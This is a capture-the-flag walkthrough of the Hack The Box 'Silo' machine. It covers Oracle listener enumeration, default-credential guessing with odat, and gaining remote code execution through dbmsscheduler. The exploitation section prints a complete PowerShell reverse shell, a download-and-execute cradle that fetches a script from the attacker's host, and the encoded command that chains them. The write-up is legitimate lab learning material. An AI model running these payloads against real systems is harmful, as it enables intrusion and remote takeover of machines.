# Box 




![](img/Pasted%20image%2020210820120757.png)


https://app.hackthebox.eu/machines/Silo

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of contents

* [Reconnaissance](#reconnaissance)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User & Root](#user--root)

# Contents 

## Reconnaissance

Let's start with nmap :

```bash
nmap -sV -sC -Pn --top-ports 1000 -oN scan_10.10.10.82 10.10.10.82
```

![](img/Pasted%20image%2020210820171352.png)

So on this box we have a lot of RPC port, a port 80 with IIS 8.5, a port 8080 and 1521 running with oracle httpd and database and finally a smb port.

Nothing could be done on the on the smb server since guest is not allowed. 

I've never encountered this oracle technology before so it was a challenge to use the tools correctly. 

This is the docs I found useful  : https://book.hacktricks.xyz/pentesting/1521-1522-1529-pentesting-oracle-listener

https://github.com/quentinhardy/odat/wiki

odat will be my primary tool because I don't want to use metasploit since I try to avoid it as much as possible.

## Exploitation

Following the hacktricks website, I enumerated the SID :

![](img/Pasted%20image%2020210820123956.png)

Since XE was the first coming up I used it for the whole box et luckilly it was the good one.

After enumerating sids, you have to bruteforce login/password. For this I used the following wordlist :  `/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt`. Copy it then you still need to modify because the software `odat` accept couple of creds with a `/` (for example root/root). And the metasploit wordlist contains space as a separator.

We can know use our wordlist : 

```
./odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file ../oracle_default_userpass.txt
```

![](img/Pasted%20image%2020210820150528.png)


Finding the user/password was a mess because an account could get "locked" and then you wouldn't find anything. So be careful with this. But well, we have a user :

| User | Password | 
| ------ | -------- |
| scott | tiger | 


Ok so now we have to get a RCE. From the hacktricks website, there are a lot of different ways to get a RCE but I only one worked for me and it was a mess to make it work.

You first need your typical reverse shell that you would use for a machine. 

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Encode it in base64 so we don't worry about strings. (https://byt3bl33d3r.github.io/converting-commands-to-powershell-compatible-encoded-strings-for-dummies.html)

Now you put this payload in a file called `rev.ps1`, usually this is enough, you download it in the remote machine, it works. Here for some reasons when I triggered the payload it would connect to my listener but shutdown directly. Now in `rev.ps1`, prepend your whole payload with `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`

You should have something like this in `rev.ps1` : 

```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AMQAz.....
```

You need to download this powershell script in the remote machine so setup a python server. 

Once again, this is the payload to download a script and executes it :

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.13:4444/rev.ps1')
```

Convert it to base64, like before. 

Your final command will look like this : 

```
./odat dbmsscheduler   -s 10.10.10.82 -U scott -P tiger -d XE  --exec "C:\Windows\System32\cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQAzADoANAA0ADQANAAvAHIAZQB2AC4AcABzADEAJwApAAoA" --sysdba
```

What happens is : 
cmd.exe -> powershell download our `rev.ps1` file -> launch a new posershell with our reverse shell. 

Also, for some reasons the --sysdba is needed because our user does not have enough privilege to run commands. 

After that you should get a shell :

![](img/Pasted%20image%2020210820174143.png)

![](img/Pasted%20image%2020210820174154.png)

![](img/Pasted%20image%2020210820174205.png)

## Post-Exploitation
### User & Root

Commands like `systeminfo` and `whoami` are not working but we can go to the administrator folder so I guess we are system anyways. 

![](img/Pasted%20image%2020210820174332.png)

![](img/Pasted%20image%2020210820174356.png)